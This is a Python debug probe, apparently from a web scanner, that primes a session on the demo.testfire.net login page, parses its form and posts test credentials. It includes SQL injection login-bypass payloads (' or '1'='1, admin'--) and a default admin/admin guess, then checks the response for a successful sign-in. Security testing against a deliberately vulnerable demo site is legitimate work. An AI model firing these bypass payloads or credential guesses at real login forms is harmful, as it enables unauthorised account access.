#!/usr/bin/env python3
"""Debug probe: replicate sentinel/auth.py login semantics exactly.

- GET login page first (prime session)
- parse the form (all fields incl. hidden/submit)
- POST uid/passw + form fields, DO NOT follow redirects
- inspect raw status + Location + body
"""
import http.cookiejar
import re
import sys
import urllib.request
import urllib.parse

LOGIN_URL = "http://demo.testfire.net/login.jsp"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))  # follows redirects
op_nr = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))  # keep, but we do manual below

# 1. prime
req = urllib.request.Request(LOGIN_URL, headers={"User-Agent": "sentinel-probe/2.8.0"})
with op.open(req, timeout=30) as r:
    page = r.read().decode("utf-8", "replace")
print("login page len:", len(page))
forms = re.findall(r"<form[^>]*>(.*?)</form>", page, re.S | re.I)
actions = re.findall(r"<form[^>]*action=[\"']([^\"']+)[\"']", page, re.I)
print("forms on page:", list(zip(actions, [re.findall(r"name=[\"']([^\"']+)[\"']", f_, re.I) for f_ in forms])))
# pick the login form: action mentions login, or fields include uid/passw
action, fields = None, []
for a, f_ in zip(actions, forms):
    flds = re.findall(r"name=[\"']([^\"']+)[\"']", f_, re.I)
    if "uid" in flds or "passw" in flds or (a and "login" in a.lower()):
        action, fields = a, flds
        break
if not action:
    action, fields = "login.jsp", []
print("chosen login form:", action, fields)

action_abs = urllib.parse.urljoin(LOGIN_URL, action or "login.jsp")

def submit(user, pw, extra):
    data = {"uid": user, "passw": pw}
    data.update(extra)
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(action_abs, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "sentinel-probe/2.8.0")
    # manual redirect: use a handler that stops at 30x
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    op2 = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect())
    try:
        with op2.open(req, timeout=30) as resp:
            return resp.status, resp.headers.get("Location", ""), resp.read(80000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("Location", "") if e.headers else "", e.read(80000).decode("utf-8", "replace")

extra = {f: "" for f in fields if f not in ("uid", "passw")}
# try to fill submit button value if present
mbtn = re.search(r"<input[^>]*name=[\"']btnSubmit[\"'][^>]*value=[\"']([^\"']+)[\"']", page, re.I)
if mbtn:
    extra["btnSubmit"] = mbtn.group(1)

for label, u, p in [
    ("control jsmith/demo1234", "jsmith", "demo1234"),
    ("admin/admin", "admin", "admin"),
    ("sqli ' or '1'='1", "' or '1'='1", "x"),
    ("sqli admin'--", "admin'--", "x"),
]:
    st, loc, body = submit(u, p, extra)
    has_signoff = "sign off" in body.lower()
    err = re.search(r"(error|invalid|incorrect|failed)[^<]{0,80}", body, re.I)
    print(f"\n[{label}] status={st} location={loc!r} sign_off={has_signoff} body_len={len(body)}")
    if err:
        print("   msg:", err.group(0)[:120])
    print("   head:", body[:200].replace("\n", " ")[:180])
